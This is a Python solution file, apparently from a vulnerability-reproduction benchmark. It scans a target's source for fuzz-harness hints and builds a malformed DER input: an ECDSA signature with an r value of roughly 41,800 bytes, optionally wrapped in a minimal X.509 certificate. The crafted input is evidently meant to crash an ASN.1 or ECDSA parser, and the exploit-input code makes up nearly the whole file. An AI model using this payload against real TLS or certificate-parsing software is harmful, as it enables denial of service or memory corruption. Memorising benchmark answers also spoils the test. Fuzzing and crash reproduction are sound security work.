import os
import re
import tarfile
from typing import Iterator, Optional


def _encode_asn1_len(n: int) -> bytes:
    if n < 0:
        raise ValueError("negative length")
    if n < 0x80:
        return bytes([n])
    b = n.to_bytes((n.bit_length() + 7) // 8, "big")
    return bytes([0x80 | len(b)]) + b


def _asn1_tlv(tag: int, content: bytes) -> bytes:
    return bytes([tag]) + _encode_asn1_len(len(content)) + content


def _oid_bytes(oid: str) -> bytes:
    parts = [int(x) for x in oid.strip().split(".") if x]
    if len(parts) < 2:
        raise ValueError("bad oid")
    first = 40 * parts[0] + parts[1]
    out = bytearray([first])
    for v in parts[2:]:
        if v < 0:
            raise ValueError("bad oid component")
        stack = [v & 0x7F]
        v >>= 7
        while v:
            stack.append(0x80 | (v & 0x7F))
            v >>= 7
        out.extend(reversed(stack))
    return bytes(out)


def _build_ecdsa_sig_der(total_len: int = 41798) -> bytes:
    # total_len = rlen + 11 (for rlen >= 128, slen=1)
    rlen = total_len - 11
    if rlen < 1:
        rlen = 1
    r = b"\x01" * rlen
    int1 = b"\x02" + _encode_asn1_len(len(r)) + r
    int2 = b"\x02\x01\x01"
    payload = int1 + int2
    return b"\x30" + _encode_asn1_len(len(payload)) + payload


def _build_min_x509_with_sig(sig_der: bytes) -> bytes:
    # Minimal-ish Certificate wrapping a signature BIT STRING.
    # This is used only if we detect the harness parses X.509 certificates.
    oid_ecdsa_sha256 = _asn1_tlv(0x06, _oid_bytes("1.2.840.10045.4.3.2"))
    alg_ecdsa_sha256 = _asn1_tlv(0x30, oid_ecdsa_sha256)

    oid_ec_public_key = _asn1_tlv(0x06, _oid_bytes("1.2.840.10045.2.1"))
    oid_prime256v1 = _asn1_tlv(0x06, _oid_bytes("1.2.840.10045.3.1.7"))
    spki_alg = _asn1_tlv(0x30, oid_ec_public_key + oid_prime256v1)

    pubkey = b"\x04" + (b"\x01" * 64)  # Uncompressed point placeholder (65 bytes)
    spki_pub = _asn1_tlv(0x03, b"\x00" + pubkey)
    spki = _asn1_tlv(0x30, spki_alg + spki_pub)

    version_v3 = bytes([0xA0]) + _encode_asn1_len(3) + b"\x02\x01\x02"
    serial = _asn1_tlv(0x02, b"\x01")

    name_empty = _asn1_tlv(0x30, b"")
    not_before = _asn1_tlv(0x17, b"250101000000Z")
    not_after = _asn1_tlv(0x17, b"260101000000Z")
    validity = _asn1_tlv(0x30, not_before + not_after)

    tbs = _asn1_tlv(
        0x30,
        version_v3 +
        serial +
        alg_ecdsa_sha256 +
        name_empty +
        validity +
        name_empty +
        spki
    )

    sig_bitstring = _asn1_tlv(0x03, b"\x00" + sig_der)
    cert = _asn1_tlv(0x30, tbs + alg_ecdsa_sha256 + sig_bitstring)
    return cert


def _iter_small_texts_from_tar(tar_path: str, max_bytes: int = 2_000_000) -> Iterator[str]:
    try:
        with tarfile.open(tar_path, "r:*") as tf:
            for m in tf.getmembers():
                if not m.isfile():
                    continue
                if m.size <= 0 or m.size > max_bytes:
                    continue
                name = m.name.lower()
                if any(name.endswith(ext) for ext in (".c", ".cc", ".cpp", ".h", ".hpp", ".m", ".mm", ".rs", ".go", ".py", ".java", ".js", ".ts", ".txt", ".md", ".mk", ".cmake")) or "fuzz" in name or "harness" in name:
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    data = f.read()
                    try:
                        yield data.decode("utf-8", "ignore")
                    except Exception:
                        yield data.decode("latin1", "ignore")
    except Exception:
        return


def _iter_small_texts_from_dir(dir_path: str, max_bytes: int = 2_000_000) -> Iterator[str]:
    for root, _, files in os.walk(dir_path):
        for fn in files:
            path = os.path.join(root, fn)
            try:
                st = os.stat(path)
            except Exception:
                continue
            if st.st_size <= 0 or st.st_size > max_bytes:
                continue
            low = fn.lower()
            if any(low.endswith(ext) for ext in (".c", ".cc", ".cpp", ".h", ".hpp", ".m", ".mm", ".rs", ".go", ".py", ".java", ".js", ".ts", ".txt", ".md", ".mk", ".cmake")) or "fuzz" in low or "harness" in low:
                try:
                    with open(path, "rb") as f:
                        data = f.read()
                    try:
                        yield data.decode("utf-8", "ignore")
                    except Exception:
                        yield data.decode("latin1", "ignore")
                except Exception:
                    continue


def _detect_expected_input_kind(src_path: str) -> str:
    # Returns "signature" or "x509"
    x509_score = 0
    sig_score = 0
    seen_fuzzer = 0

    if os.path.isdir(src_path):
        texts = _iter_small_texts_from_dir(src_path)
    else:
        texts = _iter_small_texts_from_tar(src_path)

    for t in texts:
        if "LLVMFuzzerTestOneInput" in t or "LLVMFuzzerInitialize" in t:
            seen_fuzzer += 1

        lower = t.lower()

        if ("llvmfuzzertestoneinput" in lower) or ("fuzzer" in lower) or ("harness" in lower) or ("/fuzz" in lower) or ("oss-fuzz" in lower):
            if "x509" in lower or "certificate" in lower or "crt_parse" in lower or "x509_crt_parse" in lower or "d2i_x509" in lower:
                x509_score += 5
            if "ecdsa" in lower and ("signature" in lower or "sig" in lower) and ("asn1" in lower or "der" in lower):
                sig_score += 4
            if "tls" in lower or "ssl" in lower:
                sig_score += 1

        # Non-harness hints
        if "x509_crt_parse" in lower or "d2i_x509" in lower:
            x509_score += 2
        if "d2i_ecdsa_sig" in lower or "ecdsa_sig" in lower:
            sig_score += 2

        if seen_fuzzer >= 2 and (x509_score >= 8 or sig_score >= 8):
            break

    if x509_score >= sig_score + 5 and x509_score > 0:
        return "x509"
    return "signature"


class Solution:
    def solve(self, src_path: str) -> bytes:
        sig_der = _build_ecdsa_sig_der(41798)

        kind = _detect_expected_input_kind(src_path)
        if kind == "x509":
            return _build_min_x509_with_sig(sig_der)

        return sig_der